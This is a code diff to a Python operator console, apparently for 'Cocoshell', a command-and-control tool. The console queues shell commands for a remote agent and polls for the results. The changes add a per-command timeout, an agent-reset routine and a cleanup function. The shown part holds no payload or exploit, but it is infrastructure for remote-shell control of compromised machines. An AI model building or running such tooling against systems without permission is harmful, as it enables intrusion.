@@ -16,7 +16,7 @@ parser.add_argument("-p", "--lport", help="the port the agent will connect to (d
 parser.add_argument("-f", "--frequency", help="the amount of seconds the agent waits for the next command (default: 1)")
 parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
 parser.add_argument("-v", "--verbose", help="debug messages will be printed to the console", action="store_true")
-#parser.add_argument("-t", "--timeout", help="the amount of seconds after which the agent will be declared inactive (default: 60)", type=int)
+parser.add_argument("-t", "--timeout", help="the amount of seconds after which a command is cancelled (default: 30)", type=int)
 args, leftovers = parser.parse_known_args()
 
 letters = string.ascii_lowercase
@@ -32,7 +32,8 @@ else:
 
 lport = args.lport if args.lport is not None else '5000'
 frequency = args.frequency if args.frequency is not None else 1
-timeout = 60 + frequency
+timeout_cmd = args.timeout + frequency if args.timeout is not None else 30 + frequency
+timeout_agent = 60 + frequency
 
 logger.debug("Cocoshell API starting")
 
@@ -88,8 +89,26 @@ def is_active():
     timestamp_str = cur.fetchone()[0]
     timestamp = datetime.datetime.strptime(timestamp_str, "%H:%M:%S %m/%d/%Y")
     difference = datetime.datetime.now() - timestamp
-    active = True if difference.total_seconds() > timeout else False
+    active = True if difference.total_seconds() > timeout_agent else False
     return active
+
+def command_has_timed_out(start):
+    difference = datetime.datetime.now() - start
+    timed_out = True if difference.total_seconds() > timeout_cmd else False
+    return timed_out
+
+def reset_agent():
+    cur.execute("UPDATE commands SET hasBeenRun = 1")
+    cur.execute("UPDATE pwd SET pwd = 'NULL'")
+
+def cleanup():
+    logger.debug("Cocoshell stopping")
+    logger.debug("Cleaning up")
+    reset_agent()
+    con.commit()
+    proc.terminate()
+    con.close()
+    logger.important("Cocoshell stopped")
 
 #############################################################################
 
@@ -105,6 +124,8 @@ try:
             logger.warn("the agent seems to have timed out")
 
         command = input(f"*{prompt}* {pwd}> ").strip()
+        command_start_time = datetime.datetime.now()
+
         if command == "exit":
             raise SystemExit
         if command == "":
@@ -136,8 +157,14 @@ try:
             cur.execute("UPDATE commands SET hasBeenRun = 1")
 
         while (waiting_for_result):
+            if command_has_timed_out(command_start_time):
+                reset_agent()
+                logger.failed("the command has timed out")
+                logger.info("use the command 'pulse' to check when the agent last checked in")
+                break
             if get_last_result()[3] == 1:
                 waiting_for_result = False
+                command_start_time = None
                 result = get_last_result()
                 if result[2]:
                     logger.debug("Received output from agent")
@@ -147,6 +174,8 @@ try:
                 else:
                     logger.failed("No output for that command")
                     logger.failed("The command probably failed")
+            else:
+                time.sleep(0.5)
     
 except KeyboardInterrupt:
     print("")
@@ -157,11 +186,4 @@ except SystemExit:
     logger.debug("Exiting")
     pass
 finally:
-    logger.debug("Cocoshell stopping")
-    logger.debug("Cleaning up")
-    cur.execute("UPDATE commands SET hasBeenRun = 1")
-    cur.execute("UPDATE pwd SET pwd = 'NULL'")
-    con.commit()
-    proc.terminate()
-    con.close()
-    logger.important("Cocoshell stopped")
+    cleanup()
